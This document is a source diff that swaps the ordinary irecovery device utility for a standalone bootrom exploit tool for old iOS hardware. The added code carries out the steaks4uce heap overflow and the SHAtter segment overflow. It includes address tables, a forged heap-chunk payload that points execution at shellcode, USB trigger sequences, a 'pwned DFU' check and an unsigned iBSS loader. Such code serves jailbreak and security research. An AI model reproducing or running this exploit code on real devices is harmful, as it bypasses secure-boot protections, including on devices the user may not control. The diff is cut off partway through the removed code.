@@ -1,760 +1,441 @@
-/*
- * irecovery.c
- * Software frontend for iBoot/iBSS communication with iOS devices
- *
- * Copyright (c) 2012-2023 Nikias Bassen <nikias@gmx.li>
- * Copyright (c) 2012-2015 Martin Szulecki <martin.szulecki@libimobiledevice.org>
- * Copyright (c) 2010-2011 Chronic-Dev Team
- * Copyright (c) 2010-2011 Joshua Hill
- * Copyright (c) 2008-2011 Nicolas Haunold
- *
- * All rights reserved. This program and the accompanying materials
- * are made available under the terms of the GNU Lesser General Public License
- * (LGPL) version 2.1 which accompanies this distribution, and is available at
- * http://www.gnu.org/licenses/lgpl-2.1.html
- *
- * This library is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
- * Lesser General Public License for more details.
- */
-
-#ifdef HAVE_CONFIG_H
-#include "config.h"
-#endif
-
-#define TOOL_NAME "irecovery"
-
 #include <stdio.h>
+#include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
-#include <string.h>
-#include <getopt.h>
-#include <inttypes.h>
-#include <ctype.h>
+
+#include "shatter.h"
+#include "steaks4uce.h"
 #include <libirecovery.h>
-#ifdef HAVE_READLINE
-#include <readline/readline.h>
-#include <readline/history.h>
-#else
-#ifndef _WIN32
-#include <termios.h>
-#endif
-#endif
 
-#ifdef _WIN32
-#include <windows.h>
-#include <conio.h>
-#define sleep(n) Sleep(1000 * n)
-#endif
+#define MAX_PACKET_SIZE 0x800
 
-#define FILE_HISTORY_PATH ".irecovery"
-#define debug(...) if (verbose) fprintf(stderr, __VA_ARGS__)
-
-enum {
-	kNoAction,
-	kResetDevice,
-	kStartShell,
-	kSendCommand,
-	kSendFile,
-	kSendExploit,
-	kSendScript,
-	kShowMode,
-	kRebootToNormalMode,
-	kQueryInfo,
-	kListDevices
+const uint32_t constants_240_4[] = {
+    0x22030000, //  1 - MAIN_STACK_ADDRESS
+        0x3af5, //  2 - nor_power_on
+        0x486d, //  3 - nor_init
+        0x6c81, //  4 - usb_destroy
+        0x1059, //  5 - usb_shutdown
+         0x560, //  6 - invalidate_instruction_cache
+    0x2202d800, //  7 - RELOCATE_SHELLCODE_ADDRESS
+         0x200, //  8 - RELOCATE_SHELLCODE_SIZE
+        0x795c, //  9 - memmove
+         0x534, // 10 - clean_data_cache
+         0x280, // 11 - gVersionString
+        0x83cd, // 12 - strlcat
+        0x30e9, // 13 - usb_wait_for_image
+    0x22000000, // 14 - LOAD_ADDRESS
+       0x24000, // 15 - MAX_SIZE
+    0x220241ac, // 16 - gLeakingDFUBuffer
+        0x1955, // 17 - free
+    0x65786563, // 18 - EXEC_MAGIC
+        0x1bf1, // 19 - memz_create
+        0x3339, // 20 - jump_to
+        0x1c19, // 21 - memz_destroy
+          0x58, // 22 - IMAGE3_LOAD_SP_OFFSET
+          0x54, // 23 - IMAGE3_LOAD_STRUCT_OFFSET
+        0x1c5d, // 24 - image3_create_struct
+        0x22cd, // 25 - image3_load_continue
+        0x23a3  // 26 - image3_load_fail
 };
 
-static unsigned int quit = 0;
-static unsigned int verbose = 0;
+const uint32_t constants_240_5_1[] = {
+    0x22030000, //  1 - MAIN_STACK_ADDRESS
+        0x3afd, //  2 - nor_power_on
+        0x4875, //  3 - nor_init
+        0x6c89, //  4 - usb_destroy
+        0x1059, //  5 - usb_shutdown
+         0x560, //  6 - invalidate_instruction_cache
+    0x2202d800, //  7 - RELOCATE_SHELLCODE_ADDRESS
+         0x200, //  8 - RELOCATE_SHELLCODE_SIZE
+        0x7964, //  9 - memmove
+         0x534, // 10 - clean_data_cache
+         0x280, // 11 - gVersionString
+        0x83d5, // 12 - strlcat
+        0x30f1, // 13 - usb_wait_for_image
+    0x22000000, // 14 - LOAD_ADDRESS
+       0x24000, // 15 - MAX_SIZE
+    0x220241ac, // 16 - gLeakingDFUBuffer
+        0x1955, // 17 - free
+    0x65786563, // 18 - EXEC_MAGIC
+        0x1bf9, // 19 - memz_create
+        0x3341, // 20 - jump_to
+        0x1c21, // 21 - memz_destroy
+          0x58, // 22 - IMAGE3_LOAD_SP_OFFSET
+          0x54, // 23 - IMAGE3_LOAD_STRUCT_OFFSET
+        0x1c65, // 24 - image3_create_struct
+        0x22d5, // 25 - image3_load_continue
+        0x23ab  // 26 - image3_load_fail
+};
 
-void print_progress_bar(double progress);
-int received_cb(irecv_client_t client, const irecv_event_t* event);
-int progress_cb(irecv_client_t client, const irecv_event_t* event);
-int precommand_cb(irecv_client_t client, const irecv_event_t* event);
-int postcommand_cb(irecv_client_t client, const irecv_event_t* event);
+const uint32_t payload_data[] = {
+          0x84, // 0x00: previous_chunk
+          0x05, // 0x04: next_chunk
+          0x80, // 0x08: buffer[0] - direction
+    0x22026280, // 0x0c: buffer[1] - usb_response_buffer
+    0xFFFFFFFF, // 0x10: buffer[2]
+         0x138, // 0x14: buffer[3] - size of payload in bytes
+         0x100, // 0x18: buffer[4]
+           0x0, // 0x1c: buffer[5]
+           0x0, // 0x20: buffer[6]
+           0x0, // 0x24: unused
+          0x15, // 0x28: previous_chunk (fake free chunk)
+           0x2, // 0x2c: next_chunk
+    0x22000001, // 0x30: fd - shellcode_address
+    0x2202D7FC  // 0x34: bk - LR on the stack
+};
 
-static void shell_usage()
-{
-	printf("Usage:\n");
-	printf("  /upload FILE\t\tsend FILE to device\n");
-	printf("  /limera1n [FILE]\trun limera1n exploit and send optional payload from FILE\n");
-	printf("  /deviceinfo\t\tprint device information (ECID, IMEI, etc.)\n");
-	printf("  /help\t\t\tshow this help\n");
-	printf("  /exit\t\t\texit interactive shell\n");
+int acquire_device(irecv_client_t *client) {
+    irecv_error_t err;
+
+    for (int i = 0; i <= 5; i++) {
+        printf("Acquiring device handle.\n");
+
+        err = irecv_open_with_ecid(client, 0);
+        if (err == IRECV_E_UNSUPPORTED) {
+            fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
+            return -1;
+        } else if (err == IRECV_E_SUCCESS) {
+            return 0;
+        }
+
+        sleep(1);
+    }
+
+    fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
+    return -1;
 }
 
-static const char* mode_to_str(int mode)
-{
-	switch (mode) {
-		case IRECV_K_RECOVERY_MODE_1:
-		case IRECV_K_RECOVERY_MODE_2:
-		case IRECV_K_RECOVERY_MODE_3:
-		case IRECV_K_RECOVERY_MODE_4:
-			return "Recovery";
-			break;
-		case IRECV_K_DFU_MODE:
-			return "DFU";
-			break;
-		case IRECV_K_PORT_DFU_MODE:
-			return "Port DFU";
-			break;
-		case IRECV_K_WTF_MODE:
-			return "WTF";
-			break;
-		default:
-			return "Unknown";
-			break;
-	}
+void release_device(irecv_client_t client) {
+    printf("Releasing device handle.\n");
+    irecv_close(client);
 }
 
-static void buffer_read_from_filename(const char *filename, char **buffer, uint64_t *length)
-{
-	FILE *f;
-	uint64_t size;
-
-	*length = 0;
-
-	f = fopen(filename, "rb");
-	if (!f) {
-		return;
-	}
-
-	fseek(f, 0, SEEK_END);
-	size = ftell(f);
-	rewind(f);
-
-	if (size == 0) {
-		fclose(f);
-		return;
-	}
-
-	*buffer = (char*)malloc(sizeof(char)*(size+1));
-	fread(*buffer, sizeof(char), size, f);
-	fclose(f);
-
-	*length = size;
+int reset_counters(irecv_client_t client) {
+    printf("Resetting USB counters.\n");
+    int ret = irecv_reset_counters(client);
+    if (ret < 0) {
+        fprintf(stderr, "ERROR: Failed to reset USB counters.\n");
+        return -1;
+    }
+    return ret;
 }
 
-static void print_hex(unsigned char *buf, size_t len)
-{
-	size_t i;
-	for (i = 0; i < len; i++) {
-		printf("%02x", buf[i]);
-	}
+void usb_reset(irecv_client_t client) {
+    printf("Performing USB port reset.\n");
+    irecv_reset(client);
+    return;
 }
 
-static void print_device_info(irecv_client_t client)
-{
-	int ret, mode;
-	irecv_device_t device = NULL;
-	const struct irecv_device_info *devinfo = irecv_get_device_info(client);
-	if (devinfo) {
-		printf("CPID: 0x%04x\n", devinfo->cpid);
-		printf("CPRV: 0x%02x\n", devinfo->cprv);
-		printf("BDID: 0x%02x\n", devinfo->bdid);
-		printf("ECID: 0x%016" PRIx64 "\n", devinfo->ecid);
-		printf("CPFM: 0x%02x\n", devinfo->cpfm);
-		printf("SCEP: 0x%02x\n", devinfo->scep);
-		printf("IBFL: 0x%02x\n", devinfo->ibfl);
-		printf("SRTG: %s\n", (devinfo->srtg) ? devinfo->srtg : "N/A");
-		printf("SRNM: %s\n", (devinfo->srnm) ? devinfo->srnm : "N/A");
-		printf("IMEI: %s\n", (devinfo->imei) ? devinfo->imei : "N/A");
-		printf("NONC: ");
-		if (devinfo->ap_nonce) {
-			print_hex(devinfo->ap_nonce, devinfo->ap_nonce_size);
-		} else {
-			printf("N/A");
-		}
-		printf("\n");
-		printf("SNON: ");
-		if (devinfo->sep_nonce) {
-			print_hex(devinfo->sep_nonce, devinfo->sep_nonce_size);
-		} else {
-			printf("N/A");
-		}
-		printf("\n");
-		char* p = strstr(devinfo->serial_string, "PWND:[");
-		if (p) {
-			p+=6;
-			char* pend = strchr(p, ']');
-			if (pend) {
-				printf("PWND: %.*s\n", (int)(pend-p), p);
-			}
-		}
-	} else {
-		printf("Could not get device info?!\n");
-	}
+int send_data(irecv_client_t client, const unsigned char* data, size_t data_len) {
+    size_t index = 0;
+    printf("Sending 0x%zx bytes of data to device.\n", data_len);
 
-	ret = irecv_get_mode(client, &mode);
-	if (ret == IRECV_E_SUCCESS) {
-		switch (devinfo->pid) {
-			case 0x1881:
-				printf("MODE: DFU via Debug USB (KIS)\n");
-				break;
-			default:
-				printf("MODE: %s\n", mode_to_str(mode));
-				break;
-		}
-	}
+    while (index < data_len) {
+        size_t amount = (data_len - index > MAX_PACKET_SIZE) ? MAX_PACKET_SIZE : (data_len - index);
+        int ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, (unsigned char*)(data + index), (uint16_t)amount, 5000);
+        if (ret != amount) {
+            fprintf(stderr, "ERROR: Transfer failed at index %zu: expected %zu, got %d\n", index, amount, ret);
+            return -1;
+        }
+        index += amount;
+    }
 
-	irecv_devices_get_device_by_client(client, &device);
-	if (device) {
-		printf("PRODUCT: %s\n", device->product_type);
-		printf("MODEL: %s\n", device->hardware_model);
-		printf("NAME: %s\n", device->display_name);
-	}
+    return 0;
 }
 
-static void print_devices()
-{
-	struct irecv_device *devices = irecv_devices_get_all();
-	struct irecv_device *device = NULL;
-	int i = 0;
+int get_data(irecv_client_t client, size_t amount){
+    int ret;
+    unsigned char part[MAX_PACKET_SIZE];
+    printf("Getting 0x%zx bytes of data from device.\n", amount);
 
-	for (i = 0; devices[i].product_type != NULL; i++) {
-		device = &devices[i];
+    for(int i = 0; i < amount; i += MAX_PACKET_SIZE){
+        int transfer_size = (amount - i < MAX_PACKET_SIZE) ? (amount - i) : MAX_PACKET_SIZE;
+        ret = irecv_usb_control_transfer(client, 0xA1, 2, 0, 0, part, transfer_size, 100);
+    }
 
-		printf("%s %s 0x%02x 0x%04x %s\n", device->product_type, device->hardware_model, device->board_id, device->chip_id, device->display_name);
-	}
+    return ret;
 }
 
-static int _is_breq_command(const char* cmd)
-{
-	return (
-		!strcmp(cmd, "go")
-		|| !strcmp(cmd, "bootx")
-		|| !strcmp(cmd, "reboot")
-		|| !strcmp(cmd, "memboot")
-	);
+int request_image_validation(irecv_client_t client) {
+    int ret;
+    unsigned char dummy[6];
+    printf("Requesting image validation.\n");
+
+    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, 0, 0, 1000);
+    if (ret != 0) {
+        fprintf(stderr, "ERROR: Control transfer (0x21,1) failed with code %d\n", ret);
+        return -1;
+    }
+
+    for (int i = 0; i < 3; i++) {
+        ret = irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, dummy, 6, 1000);
+        if (ret != 6) {
+            fprintf(stderr, "ERROR: Control transfer (0xA1,3) #%d failed with code %d\n", i + 1, ret);
+            return -1;
+        }
+    }
+
+    usb_reset(client);
+    return 0;
 }
 
-static void parse_command(irecv_client_t client, unsigned char* command, unsigned int size)
-{
-	char* cmd = strdup((char*)command);
-	char* action = strtok(cmd, " ");
+int steaks4uce_exploit(irecv_client_t client) {
+    int ret;
+    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
+    printf("*** based on steaks4uce exploit (heap overflow) by pod2g ***\n");
 
-	if (!strcmp(cmd, "/exit")) {
-		quit = 1;
-	} else if (!strcmp(cmd, "/help")) {
-		shell_usage();
-	} else if (!strcmp(cmd, "/upload")) {
-		char* filename = strtok(NULL, " ");
-		debug("Uploading file %s\n", filename);
-		if (filename != NULL) {
-			irecv_send_file(client, filename, 0);
-		}
-	} else if (!strcmp(cmd, "/deviceinfo")) {
-		print_device_info(client);
-	} else if (!strcmp(cmd, "/limera1n")) {
-		char* filename = strtok(NULL, " ");
-		debug("Sending limera1n payload %s\n", filename);
-		if (filename != NULL) {
-			irecv_send_file(client, filename, 0);
-		}
-		irecv_trigger_limera1n_exploit(client);
-	} else if (!strcmp(cmd, "/execute")) {
-		char* filename = strtok(NULL, " ");
-		debug("Executing script %s\n", filename);
-		if (filename != NULL) {
-			char* buffer = NULL;
-			uint64_t buffer_length = 0;
-			buffer_read_from_filename(filename, &buffer, &buffer_length);
-			if (buffer) {
-				buffer[buffer_length] = '\0';
-				irecv_execute_script(client, buffer);
-				free(buffer);
-			} else {
-				printf("Could not read file '%s'\n", filename);
-			}
-		}
-	} else {
-		printf("Unsupported command %s. Use /help to get a list of available commands.\n", cmd);
-	}
+    // Prepare shellcode
+    const uint32_t *constants = NULL;
+    size_t const_offset = steaks4uce_shellcode_len - 4 * 26;
+    if (strstr(devinfo->srtg, "240.4"))
+        constants = constants_240_4;
+    else
+        constants = constants_240_5_1;
+    for (int i = 0; i < 26; i++) {
+        uint32_t *ptr = (uint32_t*)(steaks4uce_shellcode + const_offset + 4 * i);
+        if (*ptr != (0xBAD00001 + i)) {
+            fprintf(stderr, "ERROR: Placeholder mismatch at index %d (expected 0x%08x, found 0x%08x)\n", i, *ptr, 0xBAD00001 + i);
+            return -1;
+        }
+        *ptr = constants[i];
+    }
 
-	free(action);
+    // Prepare payload
+    unsigned char payload[0x138] = {0};
+    memcpy(payload + 0x100, payload_data, sizeof(payload_data));
+
+    ret = reset_counters(client);
+    if (ret < 0)
+        return -1;
+
+    printf("Uploading patched shellcode for %s: %#zx of data\n", devinfo->srtg, (size_t)steaks4uce_shellcode_len);
+    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, steaks4uce_shellcode, steaks4uce_shellcode_len, 5000);
+    if (ret < 0) {
+        fprintf(stderr, "ERROR: Failed to send steaks4uce to the device.\n");
+        return -1;
+    }
+
+    printf("Uploading payload: %#zx of data\n", sizeof(payload));
+    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, payload, sizeof(payload), 5000);
+    if (ret < 0) {
+        fprintf(stderr, "ERROR: Failed to upload payload.\n");
+        return -1;
+    }
+
+    printf("Triggering the exploit.\n");
+    ret = irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, payload, sizeof(payload), 1000);
+    if (ret != sizeof(payload)) {
+        fprintf(stderr, "ERROR: Failed to execute steaks4uce.\n");
+        return -1;
+    }
+
+    release_device(client);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    printf("Reconnecting to device.\n");
+    client = irecv_reconnect(client, 2);
+    if (client == NULL) {
+        fprintf(stderr, "ERROR: Unable to reconnect to device.\n");
+        return -1;
+    }
+
+    devinfo = irecv_get_device_info(client);
+    char* p = strstr(devinfo->serial_string, "PWND:[steaks4uce]");
+    if (!p) {
+        fprintf(stderr, "ERROR: Exploit failed. Device did not enter pwned DFU mode.\n");
+        return -1;
+    }
+
+    release_device(client);
+
+    printf("Device is now in pwned DFU mode.\n");
+    return 0;
 }
 
-static void load_command_history()
-{
-#ifdef HAVE_READLINE
-	read_history(FILE_HISTORY_PATH);
-#endif
+int shatter_exploit(irecv_client_t client) {
+    int ret;
+    printf("*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***\n");
+
+    ret = reset_counters(client);
+    if (ret < 0)
+        return -1;
+
+    ret = get_data(client, 0x40);
+    if (ret < 0)
+        return -1;
+
+    usb_reset(client);
+
+    release_device(client);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    ret = request_image_validation(client);
+    if (ret < 0)
+        return -1;
+
+    release_device(client);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    ret = get_data(client, 0x2C000);
+    if (ret < 0)
+        return -1;
+
+    release_device(client);
+
+    usleep(500000);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    ret = reset_counters(client);
+    if (ret < 0)
+        return -1;
+
+    ret = get_data(client, 0x140);
+    if (ret < 0)
+        return -1;
+
+    usb_reset(client);
+
+    release_device(client);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    ret = request_image_validation(client);
+    if (ret < 0)
+        return -1;
+
+    release_device(client);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    ret = send_data(client, shatter_shellcode, shatter_shellcode_len);
+    if (ret < 0)
+        return -1;
+
+    ret = get_data(client, 0x2C000);
+    if (ret < 0)
+        return -1;
+
+    release_device(client);
+
+    usleep(500000);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
+
+    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
+    char* p = strstr(devinfo->serial_string, "PWND:[SHAtter]");
+    if (!p) {
+        fprintf(stderr, "ERROR: Exploit failed. Device did not enter pwned DFU mode.\n");
+        return -1;
+    }
+
+    release_device(client);
+
+    printf("Device is now in pwned DFU mode.\n");
+    return 0;
 }
 
-static void append_command_to_history(const char* cmd)
-{
-#ifdef HAVE_READLINE
-	add_history(cmd);
-	write_history(FILE_HISTORY_PATH);
-#endif
+int boot_unpacked_ibss(irecv_client_t client, const char *ibss_path) {
+    int ret;
+    FILE *f = fopen(ibss_path, "rb");
+    if (!f) {
+        fprintf(stderr, "ERROR: Unable to open iBSS file\n");
+        return -1;
+    }
+    printf("iBSS file found: %s\n", ibss_path);
+
+    fseek(f, 0, SEEK_END);
+    int ibss_len = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    unsigned char *ibss_data = malloc(ibss_len);
+    if (!ibss_data) {
+        fprintf(stderr, "ERROR: malloc failed for iBSS data\n");
+        fclose(f);
+        return -1;
+    }
+
+    if (fread(ibss_data, 1, ibss_len, f) != ibss_len) {
+        fprintf(stderr, "ERROR: fread failed for iBSS\n");
+        fclose(f);
+        free(ibss_data);
+        return -1;
+    }
+    fclose(f);
+
+    unsigned char response_buf[0xFFFF + 1];
+    unsigned char blank[16] = {0};
+    send_data(client, blank, 16);
+    irecv_usb_control_transfer(client, 0x21, 1, 0, 0, NULL, 0, 100);
+    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
+    irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, blank, 6, 100);
+    ret = send_data(client, ibss_data, ibss_len);
+    if (ret < 0)
+        return -1;
+
+    irecv_usb_control_transfer(client, 0xA1, 2, 0xFFFF, 0, NULL, 0, 5000);
+
+    release_device(client);
+    free(ibss_data);
+
+    return 0;
 }
 
-#ifndef HAVE_READLINE
-#ifdef _WIN32
-#define BS_CC '\b'
-#else
-#define BS_CC 0x7f
-#define getch getchar
-#endif
-static void get_input(char *buf, int maxlen)
-{
-	int len = 0;
-	int c;
+int main(int argc, char* argv[]) {
+    int ret;
+    int (*exploit_func)(irecv_client_t client) = NULL;
 
-	while ((c = getch())) {
-		if ((c == '\r') || (c == '\n')) {
-			break;
-		}
-		if (isprint(c)) {
-			if (len < maxlen-1)
-				buf[len++] = c;
-		} else if (c == BS_CC) {
-			if (len > 0) {
-				fputs("\b \b", stdout);
-				len--;
-			}
-		}
-	}
-	buf[len] = 0;
-}
-#endif
+    irecv_client_t client = NULL;
+    ret = acquire_device(&client);
+    if (ret < 0)
+        return -1;
 
-static void init_shell(irecv_client_t client)
-{
-	irecv_error_t error = 0;
-	load_command_history();
-	irecv_event_subscribe(client, IRECV_PROGRESS, &progress_cb, NULL);
-	irecv_event_subscribe(client, IRECV_RECEIVED, &received_cb, NULL);
-	irecv_event_subscribe(client, IRECV_PRECOMMAND, &precommand_cb, NULL);
-	irecv_event_subscribe(client, IRECV_POSTCOMMAND, &postcommand_cb, NULL);
-	while (!quit) {
-		error = irecv_receive(client);
-		if (error != IRECV_E_SUCCESS) {
-			debug("%s\n", irecv_strerror(error));
-			break;
-		}
-#ifdef HAVE_READLINE
-		char* cmd = readline("> ");
-#else
-		char cmdbuf[4096];
-		const char* cmd = &cmdbuf[0];
-		printf("> ");
-		fflush(stdout);
-		get_input(cmdbuf, sizeof(cmdbuf));
-#endif
-		if (cmd && *cmd) {
-			if (_is_breq_command(cmd)) {
-				error = irecv_send_command_breq(client, cmd, 1);
-			} else {
-				error = irecv_send_command(client, cmd);
-			}
-			if (error != IRECV_E_SUCCESS) {
-				quit = 1;
-			}
+    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
+    char* p = strstr(devinfo->serial_string, "PWND:[");
 
-			append_command_to_history(cmd);
-		}
-#ifdef HAVE_READLINE
-		free(cmd);
-#endif
-	}
-}
+    if (argc > 1) {
+        if (p) {
+            ret = boot_unpacked_ibss(client, argv[1]);
+            return ret;
+        } else {
+            fprintf(stderr, "ERROR: Device is not in pwned DFU mode. Cannot boot unpacked iBSS.\n");
+            return -1;
+        }
+    } else if (p) {
+        printf("Device is already in pwned DFU mode.\n");
+        return 0;
+    }
 
-int received_cb(irecv_client_t client, const irecv_event_t* event)
-{
-	if (event->type == IRECV_RECEIVED) {
-		int i = 0;
-		int size = event->size;
-		const char* data = event->data;
-		for (i = 0; i < size; i++) {
-			printf("%c", data[i]);
-		}
-	}
+    if (devinfo->cpid == 0x8720)
+        exploit_func = steaks4uce_exploit;
+    else if (devinfo->cpid == 0x8930)
+        exploit_func = shatter_exploit;
+    else {
+        fprintf(stderr, "ERROR: Device is not an iPod touch 2nd generation or A4 device (CPID: %#x)\n", devinfo->cpid);
+        return -1;
+    }
 
-	return 0;
-}
+    if (!strstr(devinfo->serial_string, "240") && !strstr(devinfo->serial_string, "359") && !strstr(devinfo->serial_string, "574")) {
+        printf("Not DFU mode! Already pwned iBSS mode?\n");
+        return 0;
+    }
 
-int precommand_cb(irecv_client_t client, const irecv_event_t* event)
-{
-	if (event->type == IRECV_PRECOMMAND) {
-		if (event->data[0] == '/') {
-			parse_command(client, (unsigned char*)event->data, event->size);
-			return -1;
-		}
-	}
-
-	return 0;
-}
-
-int postcommand_cb(irecv_client_t client, const irecv_event_t* event)
-{
-	char* value = NULL;
-	char* action = NULL;
-	char* command = NULL;
-	char* argument = NULL;
-	irecv_error_t error = IRECV_E_SUCCESS;
-
-	if (event->type == IRECV_POSTCOMMAND) {
-		command = strdup(event->data);
-		action = strtok(command, " ");
-		if (!strcmp(action, "getenv")) {
-			argument = strtok(NULL, " ");
-			error = irecv_getenv(client, argument, &value);
-			if (error != IRECV_E_SUCCESS) {
-				debug("%s\n", irecv_strerror(error));
-				free(command);
-				return error;
-			}
-			printf("%s\n", value);
-			free(value);
-		}
-
-		if (!strcmp(action, "reboot")) {
-			quit = 1;
-		}
-	}
-
-	free(command);
-
-	return 0;
-}
-
-int progress_cb(irecv_client_t client, const irecv_event_t* event)
-{
-	if (event->type == IRECV_PROGRESS) {
-		print_progress_bar(event->progress);
-	}
-
-	return 0;
-}
-
-void print_progress_bar(double progress)
-{
-	int i = 0;
-
-	if (progress < 0) {
-		return;
-	}
-
-	if (progress > 100) {
-		progress = 100;
-	}
-
-	printf("\r[");
-
-	for (i = 0; i < 50; i++) {
-		if (i < progress / 2) {
-			printf("=");
-		} else {
-			printf(" ");
-		}
-	}
-
-	printf("] %3.1f%%", progress);
-
-	fflush(stdout);
-
-	if (progress == 100) {
-		printf("\n");
-	}
-}
-
-static void print_usage(int argc, char **argv)
-{
-	char *name = NULL;
-	name = strrchr(argv[0], '/');
-	printf("Usage: %s [OPTIONS]\n", (name ? name + 1: argv[0]));
-	printf("\n");
-	printf("Interact with an iOS device in DFU or recovery mode.\n");
-	printf("\n");
-	printf("OPTIONS:\n");
-	printf("  -i, --ecid ECID\tconnect to specific device by its ECID\n");
-	printf("  -c, --command CMD\trun CMD on device\n");
-	printf("  -m, --mode\t\tprint current device mode\n");
-	printf("  -f, --file FILE\tsend file to device\n");
-	printf("  -k, --payload FILE\tsend limera1n usb exploit payload from FILE\n");
-	printf("  -r, --reset\t\treset client\n");
-	printf("  -n, --normal\t\treboot device into normal mode (exit recovery loop)\n");
-	printf("  -e, --script FILE\texecutes recovery script from FILE\n");
-	printf("  -s, --shell\t\tstart an interactive shell\n");
-	printf("  -q, --query\t\tquery device info\n");
-	printf("  -a, --devices\t\tlist information for all known devices\n");
-	printf("  -v, --verbose\t\tenable verbose output, repeat for higher verbosity\n");
-	printf("  -h, --help\t\tprints this usage information\n");
-	printf("  -V, --version\t\tprints version information\n");
-	printf("\n");
-	printf("Homepage:    <" PACKAGE_URL ">\n");
-	printf("Bug Reports: <" PACKAGE_BUGREPORT ">\n");
-}
-
-int main(int argc, char* argv[])
-{
-	static struct option longopts[] = {
-		{ "ecid",    required_argument, NULL, 'i' },
-		{ "command", required_argument, NULL, 'c' },
-		{ "mode",    no_argument,       NULL, 'm' },
-		{ "file",    required_argument, NULL, 'f' },
-		{ "payload", required_argument, NULL, 'k' },
-		{ "reset",   no_argument,       NULL, 'r' },
-		{ "normal",  no_argument,       NULL, 'n' },
-		{ "script",  required_argument, NULL, 'e' },
-		{ "shell",   no_argument,       NULL, 's' },
-		{ "query",   no_argument,       NULL, 'q' },
-		{ "devices", no_argument,       NULL, 'a' },
-		{ "verbose", no_argument,       NULL, 'v' },
-		{ "help",    no_argument,       NULL, 'h' },
-		{ "version", no_argument,       NULL, 'V' },
-		{ NULL, 0, NULL, 0 }
-	};
-	int i = 0;
-	int opt = 0;
-	int action = kNoAction;
-	uint64_t ecid = 0;
-	int mode = -1;
-	char* argument = NULL;
-	irecv_error_t error = 0;
-
-	char* buffer = NULL;
-	uint64_t buffer_length = 0;
-
-	if (argc == 1) {
-		print_usage(argc, argv);
-		return 0;
-	}
-
-	while ((opt = getopt_long(argc, argv, "i:vVhrsmnc:f:e:k:qa", longopts, NULL)) > 0) {
-		switch (opt) {
-			case 'i':
-				if (optarg) {
-					char* tail = NULL;
-					ecid = strtoull(optarg, &tail, 0);
-					if (tail && (tail[0] != '\0')) {
-						ecid = 0;
-					}
-					if (ecid == 0) {
-						fprintf(stderr, "ERROR: Could not parse ECID from argument '%s'\n", optarg);
-						return -1;
-					}
-				}
-				break;
-
-			case 'v':
-				verbose += 1;
-				break;
-
-			case 'h':
-				print_usage(argc, argv);
-				return 0;
-
-			case 'm':
-				action = kShowMode;
-				break;
-
-			case 'n':
-				action = kRebootToNormalMode;
-				break;
-
-			case 'r':
-				action = kResetDevice;
-				break;
-
-			case 's':
-				action = kStartShell;
-				break;
-
-			case 'f':
-				action = kSendFile;
-				argument = optarg;
-				break;
-
-			case 'c':
-				action = kSendCommand;
-				argument = optarg;
-				break;
-
-			case 'k':
-				action = kSendExploit;
-				argument = optarg;
-				break;
-
-			case 'e':
-				action = kSendScript;
-				argument = optarg;
-				break;
-
-			case 'q':
-				action = kQueryInfo;
-				break;
-
-			case 'a':
-				action = kListDevices;
-				print_devices();
-				return 0;
-
-			case 'V':
-				printf("%s %s", TOOL_NAME, PACKAGE_VERSION);
-#ifdef HAVE_READLINE
-				printf(" (readline)");
-#endif
-				printf("\n");
-				return 0;
-
-			default:
-				fprintf(stderr, "Unknown argument\n");
-				return -1;
-		}
-	}
-
-	if (action == kNoAction) {
-		fprintf(stderr, "ERROR: Missing action option\n");
-		print_usage(argc, argv);
-		return -1;
-	}
-
-	if (verbose)
-		irecv_set_debug_level(verbose);
-
-	irecv_client_t client = NULL;
-	for (i = 0; i <= 5; i++) {
-		debug("Attempting to connect... \n");
-
-		irecv_error_t err = irecv_open_with_ecid(&client, ecid);
-		if (err == IRECV_E_UNSUPPORTED) {
-			fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
-			return -1;
-		}
-		else if (err != IRECV_E_SUCCESS)
-			sleep(1);
-		else
-			break;
-
-		if (i == 5) {
-			fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
-			return -1;
-		}
-	}
-
-	irecv_device_t device = NULL;
-	irecv_devices_get_device_by_client(client, &device);
-	if (device)
-		debug("Connected to %s, model %s, cpid 0x%04x, bdid 0x%02x\n", device->product_type, device->hardware_model, device->chip_id, device->board_id);
-
-	const struct irecv_device_info *devinfo = irecv_get_device_info(client);
-
-	switch (action) {
-		case kResetDevice:
-			irecv_reset(client);
-			break;
-
-		case kSendFile:
-			irecv_event_subscribe(client, IRECV_PROGRESS, &progress_cb, NULL);
-			error = irecv_send_file(client, argument, IRECV_SEND_OPT_DFU_NOTIFY_FINISH);
-			debug("%s\n", irecv_strerror(error));
-			break;
-
-		case kSendCommand:
-			if (devinfo->pid == 0x1881) {
-				printf("Shell is not available in Debug USB (KIS) mode.\n");
-				break;
-			}
-			if (_is_breq_command(argument)) {
-				error = irecv_send_command_breq(client, argument, 1);
-			} else {
-				error = irecv_send_command(client, argument);
-			}
-			debug("%s\n", irecv_strerror(error));
-			break;
-
-		case kSendExploit:
-			if (devinfo->pid == 0x1881) {
-				printf("Shell is not available in Debug USB (KIS) mode.\n");
-				break;
-			}
-			if (argument != NULL) {
-				irecv_event_subscribe(client, IRECV_PROGRESS, &progress_cb, NULL);
